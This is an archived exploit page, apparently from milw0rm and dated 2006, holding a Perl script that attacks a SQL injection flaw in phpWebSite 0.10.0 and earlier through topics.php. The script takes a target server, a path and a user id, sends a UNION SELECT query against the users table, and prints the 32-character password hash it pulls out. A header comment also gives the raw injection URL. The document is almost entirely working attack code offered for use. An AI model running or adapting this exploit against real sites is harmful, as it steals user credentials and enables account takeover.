<html>
<head>
<title>phpWebSite <= 0.10.0-full (topics.php) Remote SQL Injection Exploit</title>
</head>
<pre>
#!/usr/bin/perl
# 
# advisory sent in by SnIpEr_SA (selfar2002[at]hotmail.com)
# http://www.target.com/topics.php?op=viewtopic&amp;topic=-1%20Union%20select%20name,name,pass,name%20From%20users%20where%20uid=1
# ported by str0ke (milw0rm.com) from x97Rangs code (RST/GHC) http://rst.void.ru

use LWP::Simple;

$serv     =  $ARGV[0];
$path     =  $ARGV[1];
$uid      =  $ARGV[2];

sub usage
 {
    print &quot;\nUsage: $0 [server] [path] [username] \n&quot;;
    print &quot;sever    -  URL\n&quot;;
    print &quot;path     -  path to topics.php\n&quot;;
    print &quot;uid      -  uid of the user\n\n&quot;;
    exit ();}

sub work
 {
    print qq(
       ---------------------------------
#==---[ phpWebSite topic SQL-Injection  |
       ---------------------------------\n\n);&amp;board}

sub board
 {
    $URL = sprintf(&quot;http://%s%s/topics.php?op=viewtopic&amp;topic=-1+Union+select+name,name,pass,name+From+users+where+uid=%s&quot;,$serv,$path,$uid);
    $content = get &quot;$URL&quot;;
    if ($content =~ /(\w{32})/){&amp;showh;}else{print &quot;... One of those days :)\n&quot;;}}

sub showh
 {
    print &quot;[*] User: $uid Hash: $1\n\n&quot;;}

if (@ARGV != 3){&amp;usage;}else{&amp;work;}

# milw0rm.com [2006-02-24]
</pre>
</html>

